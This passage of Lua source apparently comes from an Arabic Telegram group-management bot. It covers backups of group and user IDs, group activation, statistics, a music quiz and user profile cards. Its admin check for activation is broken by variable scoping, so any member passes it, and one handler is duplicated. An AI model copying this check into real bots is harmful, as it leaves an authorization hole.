local Groups = Redis:smembers(darket..'ChekBotAdd')  
local UsersBot = Redis:smembers(darket..'Num:User:Pv')  
local Get_Json = '{"BotId": '..darket..','  
if #UsersBot ~= 0 then 
Get_Json = Get_Json..'"UsersBot":['  
for k,v in pairs(UsersBot) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..']'
end
Get_Json = Get_Json..',"GroupsBot":{'
for k,v in pairs(Groups) do   
local President = Redis:smembers(darket.."Supcreator:Group"..v)
local Constructor = Redis:smembers(darket.."Creator:Group"..v)
local Manager = Redis:smembers(darket.."Manger:Group"..v)
local Admin = Redis:smembers(darket.."Admin:Group"..v)
local Vips = Redis:smembers(darket.."Special:Group"..v)
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
end
if #President ~= 0 then 
Get_Json = Get_Json..'"President":['
for k,v in pairs(President) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Constructor ~= 0 then
Get_Json = Get_Json..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Manager ~= 0 then
Get_Json = Get_Json..'"Manager":['
for k,v in pairs(Manager) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Admin ~= 0 then
Get_Json = Get_Json..'"Admin":['
for k,v in pairs(Admin) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Vips ~= 0 then
Get_Json = Get_Json..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
Get_Json = Get_Json..'"Dev":"R2RR7"}'
end
Get_Json = Get_Json..'}}'
local File = io.open('./'..UserBot..'.json', "w")
File:write(Get_Json)
File:close()
return LuaTele.sendDocument(msg_chat_id,msg_id,'./'..UserBot..'.json', '*٠ تم جلب النسخه الاحتياطيه\n٠تحتوي على {'..#Groups..'} كروب \n٠وتحتوي على {'..#UsersBot..'} مشترك *\n', 'md')
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
send(msg_chat_id,msg_id,'*٠ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *',"md",true)  
elseif text =='الاحصائيات' then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
send(msg_chat_id,msg_id,'*٠عدد احصائيات البوت الكامله \n– – – – – – – –\n٠عدد المجموعات : '..(Redis:scard(darket..'ChekBotAdd') or 0)..'\n٠عدد المشتركين : '..(Redis:scard(darket..'Num:User:Pv') or 0)..'*',"md",true)  
end
if text == 'تفعيل' and msg.Dev then
if Redis:sismember(darket..'ban:online',msg.chat_id) then
send(msg_chat_id,msg_id,"\n*٠ عذرا هذا الكروب محظور من قبل المطور الاساسي سوف اغادر*","md",true)  
sleep(2)
LuaTele.leaveChat(msg.chat_id)
return false 
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if Redis:sismember(darket.."ChekBotAdd",msg_chat_id) then
if tonumber(Info_Chats.member_count) < tonumber((Redis:get(darket..'Num:Add:Bot') or 0)) and not msg.ControllerBot then
return send(msg_chat_id,msg_id,'٠عدد الاعضاء قليل لا يمكن تفعيل الكروب  يجب ان يكوم اكثر من :'..Redis:get(darket..'Num:Add:Bot'),"md",true)  
end
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تفعيلها مسبقا *',"md",true)  
else
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- رفع المالك والادمنيه', data = msg.sender.user_id..'/Fdmin@'..msg_chat_id},
},
{
{text = '- قفل جميع الاوامر ', data =msg.sender.user_id..'/LockAllGroup@'..msg_chat_id},
},
}
}
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
UserInfo.first_name = Name_User
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- مغادرة الكروب ', data = '/leftgroup@'..msg_chat_id}, 
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
send(Sudo_Id,0,'*\n٠ تم تفعيل كروب جديده \n٠من قام بتفعيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n٠معلومات الكروب :\n٠عدد الاعضاء : '..Info_Chats.member_count..'\n٠عدد الادمنيه : '..Info_Chats.administrator_count..'\n٠عدد المطرودين : '..Info_Chats.banned_count..'\n٠ عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
Redis:sadd(darket.."ChekBotAdd",msg_chat_id)
Redis:set(darket.."Status:Id"..msg_chat_id,true) ;Redis:del(darket.."Status:Reply"..msg_chat_id) ;Redis:del(darket.."Status:ReplySudo"..msg_chat_id) ;Redis:set(darket.."Status:BanId"..msg_chat_id,true) ;Redis:set(darket.."Status:SetId"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تفعيل الكروب *','md', true, false, false, false, reply_markup)
end
end 
if text == 'تفعيل' and not msg.Dev then
if Redis:sismember(darket..'ban:online',msg.chat_id) then
send(msg_chat_id,msg_id,"\n*٠ عذرا هذا الكروب محظور من قبل المطور الاساسي سوف اغادر*","md",true)  
sleep(2)
LuaTele.leaveChat(msg.chat_id)
return false 
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
local AddedBot = true
elseif (StatusMember == "chatMemberStatusAdministrator") then
local AddedBot = true
else
local AddedBot = false
end
if AddedBot == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرا انته لست ادمن او مالك الكروب *","md",true)  
end
if not Redis:get(darket.."BotFree") then
return send(msg_chat_id,msg_id,"\n*٠الوضع الخدمي تم تعطيله من قبل مطور البوت *","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if Redis:sismember(darket.."ChekBotAdd",msg_chat_id) then
if tonumber(Info_Chats.member_count) < tonumber((Redis:get(darket..'Num:Add:Bot') or 0)) and not msg.ControllerBot then
return send(msg_chat_id,msg_id,'٠عدد الاعضاء قليل لا يمكن تفعيل الكروب  يجب ان يكوم اكثر من :'..Redis:get(darket..'Num:Add:Bot'),"md",true)  
end
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تفعيلها مسبقا *',"md",true)  
else
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- مغادرة الكروب ', data = '/leftgroup@'..msg_chat_id}, 
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
send(Sudo_Id,0,'*\n٠ تم تفعيل كروب جديده \n٠من قام بتفعيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n٠معلومات الكروب :\n٠عدد الاعضاء : '..Info_Chats.member_count..'\n٠عدد الادمنيه : '..Info_Chats.administrator_count..'\n٠عدد المطرودين : '..Info_Chats.banned_count..'\n٠ عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- رفع المالك والادمنيه', data = msg.sender.user_id..'/Fdmin@'..msg_chat_id},
},
{
{text = '- قفل جميع الاوامر ', data =msg.sender.user_id..'/LockAllGroup@'..msg_chat_id},
},
}
}
Redis:sadd(darket.."ChekBotAdd",msg_chat_id)
Redis:set(darket.."Status:Id"..msg_chat_id,true) ;Redis:del(darket.."Status:Reply"..msg_chat_id) ;Redis:del(darket.."Status:ReplySudo"..msg_chat_id) ;Redis:set(darket.."Status:BanId"..msg_chat_id,true) ;Redis:set(darket.."Status:SetId"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تفعيل الكروب *','md', true, false, false, false, reply_markup)
end
end

if text == 'تعطيل' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if not Redis:sismember(darket.."ChekBotAdd",msg_chat_id) then
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تعطيلها مسبقا *',"md",true)  
else
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
send(Sudo_Id,0,'*\n٠ تم تعطيل كروب جديده \n٠من قام بتعطيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n٠معلومات الكروب :\n٠عدد الاعضاء : '..Info_Chats.member_count..'\n٠عدد الادمنيه : '..Info_Chats.administrator_count..'\n٠عدد المطرودين : '..Info_Chats.banned_count..'\n٠ عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
Redis:srem(darket.."ChekBotAdd",msg_chat_id)
return send(msg_chat_id,msg_id,'\n*٠الكروب : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n٠ تم تعطيلها بنجاح *','md',true)
end
end
if chat_type(msg.chat_id) == "GroupBot" and not Redis:sismember(darket.."ChekBotAdd",msg_chat_id) then
if Redis:sismember(darket..'ban:online',msg.chat_id) then
LuaTele.leaveChat(msg.chat_id)
return false 
end
Redis:sadd(darket.."ChekBotAdd",msg_chat_id)
local list = Redis:smembers(darket.."ChekBotAdd")
send(Sudo_Id,0,"*٠ تم تفعيل كروب تلقائيا عن طريق البوت*\n٠ اصبح عدد كروباتك *"..#list.."* مجموعه","md",true)
end
if chat_type(msg.chat_id) == "GroupBot" and Redis:sismember(darket.."ChekBotAdd",msg_chat_id) then
if text then
local GetMsg = Redis:incr(darket..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) 
Redis:hset(darket..':GroupUserCountMsg:'..msg.chat_id,msg.sender.user_id,GetMsg)
local UserInfo = LuaTele.getUser(msg.sender.user_id) 
if FlterBio(UserInfo.first_name) then
NameLUser = FlterBio(UserInfo.first_name)
else
NameLUser = FlterBio(UserInfo.first_name)
end
NameLUser = NameLUser
NameLUser = NameLUser:gsub("]","")
NameLUser = NameLUser:gsub("[[]","")
Redis:hset(darket..':GroupNameUser:'..msg.chat_id,msg.sender.user_id,NameLUser)
end



if text == "ترند" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*• هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
end
GroupAllRtba = Redis:hgetall(darket..':GroupUserCountMsg:'..msg.chat_id)
GetAllNames  = Redis:hgetall(darket..':GroupNameUser:'..msg.chat_id)
GroupAllRtbaL = {}
for k,v in pairs(GroupAllRtba) do table.insert(GroupAllRtbaL,{v,k}) end
Count,Kount,i = 8 , 0 , 1
for _ in pairs(GroupAllRtbaL) do Kount = Kount + 1 end
table.sort(GroupAllRtbaL, function(a, b) return tonumber(a[1]) > tonumber(b[1]) end)
if Count >= Kount then Count = Kount end
Text = " الاكثر تفاعلا هو : \n\n"
for k,v in ipairs(GroupAllRtbaL) do
if i <= Count then  Text = Text..i.."ـ ["..(GetAllNames[v[2]] or "خطأ بالأسـم").."](tg://user?id="..v[2]..") ـ~> {*"..v[1].."*}  \n" end ; i=i+1
end
return send(msg.chat_id,msg.id,Text,"md")
end
if msg.content.audio then  
if Redis:get(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id) == 'start' then
Redis:set(darket.."audio:Games"..msg.sender.user_id..":"..msg.chat_id,msg.content.audio.audio.remote.id)  
Redis:sadd(darket.."audio:Games:Bot",msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id,'started')
return send(msg.chat_id, msg.id,'• ارسل اسم الموسيقى الان ...')
end   
end

if Redis:get(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id) == 'started' then
Redis:del(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id)
local Id_audio = Redis:get(darket.."audio:Games"..msg.sender.user_id..":"..msg.chat_id)
Redis:set(darket..'Text:Games:audio'..Id_audio,text)
Redis:del(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id)
return send(msg.chat_id, msg.id,'• تم حفظ الصوت ')
end
if text== 'مسح موسيقى' and msg.reply_to_message_id then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)  
Redis:del(darket..'Text:Games:audio'..Message_Reply.content.audio.audio.remote.id)  
Redis:srem(darket.."audio:Games:Bot",Message_Reply.content.audio.audio.remote.id)  
return send(msg.chat_id, msg.id,'• تم مسح الموسيقى ومسح الجواب .')
end


if text== 'اضف موسيقى' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
Redis:set(darket.."Add:audio:Games"..msg.sender.user_id..":"..msg.chat_id,'start')
return send(msg.chat_id, msg.id,'• ارسل الموسيقى الان ...')
end

if text== ("قائمه الموسيقى") then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
local list = Redis:smembers(darket.."audio:Games:Bot")
if #list == 0 then
return send(msg.chat_id, msg.id, "• لا يوجد اسئله")
end
for k,v in pairs(list) do
LuaTele.sendAudio(msg_chat_id, msg.id,v , '', "md") 
end
end

if text== ("مسح قائمه الموسيقى") then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
local list = Redis:smembers(darket.."audio:Games:Bot")
if #list == 0 then
return send(msg.chat_id, msg.id, "• لا يوجد اسئله")
end
for k,v in pairs(list) do
Redis:del(darket..'Text:Games:audio'..v)  
Redis:srem(darket.."audio:Games:Bot",v)  
end
return send(msg.chat_id, msg.id, "• تم مسح جميع الاسئله")
end

if text== 'موسيقى' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."audio:Games:Bot")
if #list == 0 then
return send(msg.chat_id, msg.id, "• لا يوجد اسئله")
end
local quschen = list[math.random(#list)]
local GetAnswer = Redis:get(darket..'Text:Games:audio'..quschen)
Redis:set(darket..'Games:Set:Answer'..msg.chat_id,GetAnswer)
LuaTele.sendAudio(msg_chat_id, msg.id,quschen , '', "md") 
return false
end

if text == 'ايدي' or text == 'كشف' then
if msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
local UserId = Message_Reply.sender.user_id
local U = LuaTele.getUser(UserId)
local Nn = U.first_name
local RinkBot = Controller(msg_chat_id,UserId)
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(darket.."Num:Add:Games"..msg.chat_id..UserId) or 0
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',UserId) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserInfousername) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT)  
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
send(msg_chat_id,msg_id,Get_Is_Id,"md",true) 
else
send(msg_chat_id,msg_id,
'\n◂ اسمه ↫ '..Nn..
'\n◂ ايديه ↫ '..UserId..
'\n◂ معرفه ↫ ['..UserInfousername..']'..
'\n◂ رتبته ↫ '..RinkBot..
'\n◂ عدد رسايله ↫ '..TotalMsg..
'\n◂ عدد تعديلاته ↫ '..TotalEdit..
'\n◂ تفاعله ↫ '..TotalMsgT..
'\n𓆩☆𓆪',"md",true) 
end
end
end
if text == "ايدي" or text =='id' or text =='Id' or text == 'ID' then 
if msg.reply_to_message_id == 0 then
if not Redis:get(darket.."Status:Id"..msg_chat_id) then
return false
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local Name_User = UserInfo.first_name
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
local UserId = msg.sender.user_id
local RinkBot = msg.Name_Controller
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalPhoto = photo.total_count or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumberGames = Redis:get(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
local NumAdd = Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0
local Texting = {
  "بحبك 🥺♥.!",
  "وشك دا ولا وش رجل 😂",
  "صوره قمر زي صاحبها 🥺♥.!",
  "رقمي 012345... 🙈♥.!",
  "وشك دا ولا القمر 🙈♥.!",
  "هم في الارض وانت بين النجوم 🤍🎀.!",
  "غير يعم القرف دا 🙂"
}
local Description = Texting[math.random(#Texting)]
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
Get_Is_Id = Redis:get(darket.."Set:Id:Groups") or Redis:get(darket.."Set:Id:Group"..msg_chat_id)
if Redis:get(darket.."Status:IdPhoto"..msg_chat_id) then
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',msg.sender.user_id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserInfousername) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',TotalPhoto) 
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,Get_Is_Id)
else
return send(msg_chat_id,msg_id,Get_Is_Id,"md",true) 
end
else
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,Description..
'\n\n◂ اسمك ↫ '..Name_User..
'\n◂ ايديك ↫ '..UserId..
'\n◂ معرفك ↫ ['..UserInfousername..']'..
'\n◂ رتبتك ↫ '..RinkBot..
'\n◂ عدد صورك ↫ '..TotalPhoto..
'\n◂ عدد رسايلك ↫ '..TotalMsg..
'\n◂ عدد تعديلاتك ↫ '..TotalEdit..
'\n◂ تفاعلك ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..getbio(UserId)..'*'..
'\n𓆩☆𓆪', "md")
else
return send(msg_chat_id,msg_id,
'◂ اسمك ↫ '..Name_User..
'\n◂ ايديك ↫ '..UserId..
'\n◂ معرفك ↫ ['..UserInfousername..']'..
'\n◂ رتبتك ↫ '..RinkBot..
'\n◂ عدد صورك ↫ '..TotalPhoto..
'\n◂ عدد رسايلك ↫ '..TotalMsg..
'\n◂ عدد تعديلاتك ↫ '..TotalEdit..
'\n◂ تفاعلك ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..getbio(UserId)..'*'..
'\n𓆩☆𓆪',"md",true) 
end
end
else
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',msg.sender.user_id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserInfousername) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',TotalPhoto) 
return send(msg_chat_id,msg_id,'['..Get_Is_Id..']',"md",true) 
else
return send(msg_chat_id,msg_id,
'◂ اسمك ↫ '..Name_User..
'\n◂ ايديك ↫ '..UserId..
'\n◂ معرفك ↫ ['..UserInfousername..']'..
'\n◂ رتبتك ↫ '..RinkBot..
'\n◂ عدد صورك ↫ '..TotalPhoto..
'\n◂ عدد رسايلك ↫ '..TotalMsg..
'\n◂ عدد تعديلاتك ↫ '..TotalEdit..
'\n◂ تفاعلك ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..getbio(UserId)..'*'..
'\n𓆩☆𓆪',"md",true) 
end
end
end
end
if text and text:match('^كشف (%d+)$') then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId = text:match('^كشف (%d+)$')
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.username then
UserName = '@'..UserInfo.username..''
else
UserName = 'لا يوجد'
end
local Name_User = UserInfo.first_name
local RinkBot = Controller(msg_chat_id,UserId)
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(darket.."Num:Add:Games"..msg.chat_id..UserId) or 0

if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
return send(msg_chat_id,msg_id,
'◂ اسمه ↫ '..Name_User..
'\n◂ ايديه ↫ '..UserId..
'\n◂ معرفه ↫ ['..UserName..']'..
'\n◂ رتبته ↫ '..RinkBot..
'\n◂ عدد رسايله ↫ '..TotalMsg..
'\n◂ عدد تعديلاته ↫ '..TotalEdit..
'\n◂ تفاعله ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..FlterBio(getbio(UserId))..'*'..
'\n𓆩☆𓆪',"md",true) 
end
if text and text:match('^كشف (%d+)$') then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId = text:match('^كشف (%d+)$')
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.username then
UserName = '@'..UserInfo.username..''
else
UserName = 'لا يوجد'
end
local Name_User = UserInfo.first_name
local RinkBot = Controller(msg_chat_id,UserId)
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(darket.."Num:Add:Games"..msg.chat_id..UserId) or 0

if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
return send(msg_chat_id,msg_id,
'◂ اسمه ↫ '..Name_User..
'\n◂ ايديه ↫ '..UserId..
'\n◂ معرفه ↫ ['..UserName..']'..
'\n◂ رتبته ↫ '..RinkBot..
'\n◂ عدد رسايله ↫ '..TotalMsg..
'\n◂ عدد تعديلاته ↫ '..TotalEdit..
'\n◂ تفاعله ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..getbio(UserId)..'*'..
'\n𓆩☆𓆪',"md",true) 
end
if text then
